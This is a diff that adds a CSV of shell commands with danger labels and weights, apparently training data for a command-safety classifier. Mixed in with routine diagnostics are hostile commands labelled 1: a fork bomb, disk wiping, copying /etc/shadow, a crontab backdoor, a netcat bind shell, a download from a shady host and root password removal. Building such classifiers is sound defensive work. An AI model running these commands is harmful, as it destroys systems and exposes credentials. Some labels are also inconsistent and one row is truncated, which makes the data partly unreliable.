@@ -1,0 +1,193 @@
+command,label,weight
+:(){ :|:& };:,1,1
+apt-get update && apt-get install net-tools -y,0,1
+apt-get upgrade -y,0,1
+apt-key list | grep -i cuda,0,100
+apt list --upgradable,0,100
+apt update,0,100
+apt update && apt list --upgradable,0,100
+apt update && apt upgrade -y,1,100
+apt upgrade,1,100
+apt upgrade gir1.2-nm-1.0 libnm0 network-manager-config-connectivity-ubuntu network-manager,0,1
+apt upgrade -y,1,100
+cat /etc/apt/sources.list,0,1
+cat /etc/apt/sources.list.d/*,0,1
+cat /etc/cron.d/php,0,1
+cat /etc/iptables/rules.v4,0,1
+cat /etc/network/interfaces,0,1
+cat /etc/os-release,0,1
+cat /etc/services,0,1
+cat /etc/ssh/sshd_config,0,1
+cat /etc/shadow,1,100
+cat /home/mike/agentf/workspace/systemcheck/memory/services_list.txt,0,100
+cat /home/mining/public_html/cronjobs/linux/getdata_devices.sh,0,100
+cat /proc/sys/net/ipv4/ip_forward,0,1
+cat /var/log/apt/ubuntu-advantage-apt-hook.log,0,100
+cat /var/log/syslog,0,100
+cp /etc/ssh/sshd_config /tmp/sshd_backup,0,1
+cp /etc/shadow /tmp/stolen_hashes,1,100
+curl -sSL https://install.sh
+chmod -R 777 /,1,1
+chown -R root:root /,1,1
+crontab -l,0,1
+crontab -r,1,100
+curl -I google.com,0,10
+date,0,10
+dd if=/dev/zero of=/dev/sda,1,1
+df -h,0,1
+df -i,0,100
+df -i /mnt/models,0,100
+docker exec container1 top -n 1 -b,0,1
+docker exec {container_id} /bin/bash,1,100
+docker exec open-webui /bin/sh -c 'ps aux --sort=-%cpu | head -n 5',0,1
+docker exec open-webui /bin/sh -c 'which ps',0,1
+docker exec open-webui ps aux --sort=-%cpu | head -n 5,0,1
+docker exec open-webui top -n 1 -b,0,1
+docker exec open-webui which ps,0,1
+docker inspect container1,0,1
+docker inspect -f '{{json .State}}' a5325fab101e,0,1
+docker inspect -f '{{json .State.Health}}' a5325fab101e,0,1
+docker inspect -f '{{ .State }}' a5325fab101e,0,1
+docker inspect -f '{{.State}}' a5325fab101e,0,1
+docker inspect -f '{{ .State.Health }}' a5325fab101e,0,1
+docker inspect -f '{{.State.Health}}' a5325fab101e,0,1
+docker inspect -f '{{ .State.Health.Status }}' a5325fab101e,0,1
+docker inspect -f '{{.State.Health.Status}}' a5325fab101e,0,1
+docker inspect -f '{{.State.Health.Status}}' open-webui,0,1
+docker inspect -f '{{.State.Status}}' 1a473daf5cc5,0,1
+docker inspect -f '{{.State.Status}}' a5325fab101e,0,1
+docker inspect -f '{{.State.Status}}' e871a31459fe,0,1
+docker inspect -f '{{.State.Status}}' open-webui,0,1
+docker inspect open-webui,0,1
+docker logs a5325fab101e,0,1
+docker logs e871a31459fe,0,100
+docker ps,0,1
+docker ps -a,0,10
+docker ps --format 'table {{.ID}}	{{.Names}}',0,1
+docker stats --no-stream,0,1
+du -sh /mnt/models/*,0,100
+echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab,1,100
+echo 'Password is required for sudo' | sudo -S /usr/bin/true,0,1
+echo 'root:password' | chpasswd,1,1
+echo 'root:password' | chpasswd,1,100
+fdisk,1,1
+free -h,0,1
+free -m,0,10
+git status,0,5
+init 0,1,1
+iptables -F,1,1
+ip addr show,0,1
+journalctl --no-pager -n 50,0,100
+journalctl --no-pager -u docker.service,0,1
+journalctl -u plymouth-start.service,0,100
+lsblk,0,100
+ls /etc,0,1
+ls /etc/apt/sources.list.d,0,1
+ls /etc/iptables/rules.v4,0,100
+ls /etc/network/interfaces.d,0,1
+ls /etc/services,0,100
+ls -l /etc,0,1
+ls -l /etc/apt/sources.list.d,0,1
+ls -l /etc/apt/trusted.gpg,0,100
+ls -l /etc/cron.d,0,1
+ls -l /etc/ | grep ssh,0,1
+ls -l /etc/init.d/get_systemdata.sh,0,100
+ls -l /etc/iptables,0,100
+ls -l /etc/iptables/rules.v4,0,1
+ls -l /etc/network/interfaces,0,1
+ls -l /etc/resolv.conf,0,1
+ls -l /etc/services,0,1
+ls -l /etc/ssh/,0,1
+ls -l /etc/ssh/sshd_config,0,1
+ls -l /home/mining/public_html/cronjobs/linux/,0,100
+ls -l /tmp/testfile,0,100
+ls -l /var/log/syslog,0,1
+lsof | sort -k 7 -n -r,0,1
+ls /var/log,0,1
+mkdir /etc/iptables,1,100
+mkdir -p /etc/iptables,1,100
+mkdir -p /tmp/iptables,0,100
+mkfs.ext4 /dev/,1,1
+netstat,0,1
+netstat -tuln,0,10
+netstat -tuln || ss -tuln,0,100
+nc -lvp 4444 -e /bin/bash,1,100
+openssl x509 -noout -text -in cert.pem,0,10
+parted /dev/sda rm 1,1,1
+passwd -d root,1,100
+ping -c 4 10.0.0.1,0,1
+ping -c 4 127.0.0.1,0,100
+ping -c 4 192.168.1.1,0,100
+ping -c 4 8.8.8.8,0,1
+ping -c 4 example.com,0,1
+ping -c 4 google.com,0,100
+powershell -Command ...,1,1
+ps auxf | grep nginx,0,100
+ps aux | grep 'a5325fab101e',0,1
+ps aux | grep apache2,0,100
+ps aux | grep 'docker',0,1
+ps aux | grep docker,0,1
+ps aux | grep sshd,0,1
+ps aux --sort=-%cpu | head -n 5,0,1
+ps -ef,0,1
+ps -ef | grep network,0,1
+ps -ef | grep sshd,0,1
+pwd,0,15
+python3 --version,0,5
+reboot,1,1
+rm -rf /,1,1
+shutdown -h now,1,1
+ss -tuln,0,100
+ssh -R 8080:localhost:80 tunnel.com,1,80
+sudo -v,0,1
+systemctl disable apport-autoreport.service,0,1
+systemctl disable whoopsie.path,0,1
+systemctl enable --now nc-listener.service,1,50
+systemctl is-system-running,0,100
+systemctl list-units --type=service --all,0,100
+systemctl list-units --type=service --all -o status,0,100
+systemctl list-units --type=service --state=active,0,100
+systemctl list-units --type=service --state=running,0,100
+systemctl list-units --type=service --state=running -o short,0,100
+systemctl restart ssh,1,10
+systemctl status apport-autoreport.service,0,100
+systemctl status plymouth-start.service,0,100
+systemctl status postfix,0,100
+tail -n 100 /var/log/syslog,0,10
+top -n 1,0,12
+top -n 1 -b,0,1
+touch /tmp/testfile,0,1
+ufw allow 22/tcp,1,20
+uname -a,0,10
+uptime,0,10
+userdel -r,1,1
+userdel -r,1,100
+usermod -aG sudo username,1,100
+visudo -c,0,1
+whoami,0,5
+wget http://trusted.com/patch.zip -P /tmp,0,10
+wget http://shady.com/x.sh -O /usr/bin/update,1,100
+tar -xvf logs.tar.gz -C /var/log,0,5
+ls /home/username,0,100
+echo 'YourPasswordHere' | sudo -S smartctl -a /dev/sda,1,100
+echo ""your_password"" | sudo -S smartctl -a /dev/sda,1,100
+passwd username,1,100
+ls -l /home/username,0,100
+smartctl -a /dev/sdb,1,100
+smartctl -a /dev/sda,1,100
+cat /etc/netplan/50-cloud-init.yaml,0,100
+sudo apt autoremove -y,0,100
+journalctl --no-pager -f,0,100
+which netstat,0,100
+dpkg -l | grep net-tools,0,100
+apt update,0,100
+dmidecode memory,0,100
+lsof / && find / -type f -exec file {} +,0,100
+ip a,0,100
+which ss,0,100
+ps aux,0,100
+cat /etc/passwd,0,100
+ss -tuln,0,100
+echo 'your_sudo_password' | sudo -S ls /home/username,0,100
+
+
